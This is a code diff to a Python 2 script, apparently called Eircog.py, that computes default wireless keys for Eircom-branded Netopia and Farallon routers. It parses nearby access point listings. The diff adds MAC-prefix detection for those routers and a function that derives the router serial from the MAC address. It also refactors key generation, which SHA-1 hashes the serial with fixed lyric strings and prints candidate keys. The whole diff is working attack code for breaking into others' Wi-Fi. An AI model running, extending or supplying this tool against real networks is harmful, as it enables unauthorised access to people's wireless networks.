@@ -27,8 +27,10 @@ hendrix = ["Although your world wonders me, ",
            "So to you I shall put an end and"]
 
 SLEEPINTERVAL = 5
+NETOPIAPREFIX = "00:0f:cc"
+FARALLONPREFIX = "00:00:c5"
 
-def GetAPs(ssid=None):
+def GetAPs(numkeys,ssid=None):
     """Parse eircom???? ???? SSIDs.
 
     Args:
@@ -59,8 +61,10 @@ def GetAPs(ssid=None):
 
         print "Detected the following access points"
         for line in output:
-            print ": %s" % line
-            line = line.lstrip().split(" ")
+            line = line.lstrip()
+            print "|\t%s" % line
+            line = line.split(" ")
+
             if line[0].startswith("eircom"):
                 line[0] = line[0].strip("eircom")
                 if re.compile("\d{4}").match(line[1]):
@@ -68,6 +72,18 @@ def GetAPs(ssid=None):
                 else:
                     # Some people seem to be in the odd habit of joining the numbers
                     results.append([line[0]])
+            #else: 
+            #    manufacheck = CheckManufacturer(line[1])
+            #    if manufacheck:
+            #        print SerialfromMAC(line[1], manufacheck)
+            #Testing:
+            else:
+                manufacheck = CheckManufacturer(line[2])
+                if manufacheck:
+                    print "!:"
+                    macserial = SerialfromMAC(line[2], manufacheck)
+                    DoKeys(macserial, [line[0], line[1]], numkeys)
+                    continue
 
     elif sys.platform == "linux2":
 
@@ -94,7 +110,16 @@ def GetAPs(ssid=None):
         results.append(single)
 
     return results
-
+    
+def CheckManufacturer(macaddress):
+    if macaddress.startswith(NETOPIAPREFIX):
+        print "Netopia router detected. Generating tentative keys"
+        return 1
+    elif macaddress.startswith(FARALLONPREFIX):
+        print "Netopia/Farallon router detected. Generating tentative keys"
+        return 2
+    return 0
+    
 def ParseOct(instr):
     """Parse the octal numbers from the AP SSIDs
 
@@ -110,6 +135,18 @@ def ParseOct(instr):
     for digit in instr:
         octal  = (octal << 3) + int(digit)
     return octal
+    
+def SerialfromMAC(macaddress, company):
+    #We don't need no stinking 2.6 transpose(None,":")
+    # -8: in order to get the last 8 characters (the last 6 digits)
+    macaddress = filter(lambda a: a!=":", macaddress[-8:])
+    serial = 0
+    for i in macaddress:
+        serial = serial << 4
+        serial += int(i, 16)
+    if company == 1:
+        serial += 0x01000000
+    return serial
 
 def SerialNumber(ssidoct):
     """Get the serial number form the supplied octal.
@@ -136,7 +173,7 @@ def SerialNumber(ssidoct):
     fseg = (ssidoct[0] & 0xffffffff) >> (32 - 12)
     
     serialnumber = ((shiftseg | fseg) | mac_segment) + serial_start
-
+    print serialnumber
     return serialnumber
 
 def SerialString(serial):
@@ -168,7 +205,7 @@ def DoAll(numkeys):
       owt.
     """
 
-    access_points = GetAPs(optparse.options.ssidonly)
+    access_points = GetAPs(numkeys, optparse.options.ssidonly)
 
     octalbits = []
 
@@ -182,27 +219,31 @@ def DoAll(numkeys):
         serial = SerialNumber(octconv)
         
         keymass = ""
+        
+        DoKeys(serial, ap, numkeys)
 
-        if not(serial):
-            continue
-        else:
+def DoKeys(serial, ap, numkeys):
 
-            serialstr = SerialString(serial)
-            shahex = "" 
+    if not(serial):
+        return
+    else:
 
-            length = 1
-            if numkeys == 4:
-                length = len(hendrix)
-            for i in range(length):
-                shastr = sha.new(serialstr + hendrix[i])
-                shahex += shastr.hexdigest()
-                
-            ind = 0
+        serialstr = SerialString(serial)
+        shahex = "" 
+
+        length = 1
+        if numkeys == 4:
+            length = len(hendrix)
+        for i in range(length):
+            shastr = sha.new(serialstr + hendrix[i])
+            shahex += shastr.hexdigest()
             
-            print "eircom%s %s:" % (ap[0], ap[1])            
-            while (ind < numkeys*26):
-                print "\t\t%s" % shahex[ind:ind+26]
-                ind += 26
+        ind = 0
+        
+        print "eircom%s %s:" % (ap[0], ap[1])            
+        while (ind < numkeys*26):
+            print "\t\t%s" % shahex[ind:ind+26]
+            ind += 26
 
 def main():
     parser = optparse.OptionParser(usage=("Usage: Eircog.py [-s|--ssidonly "
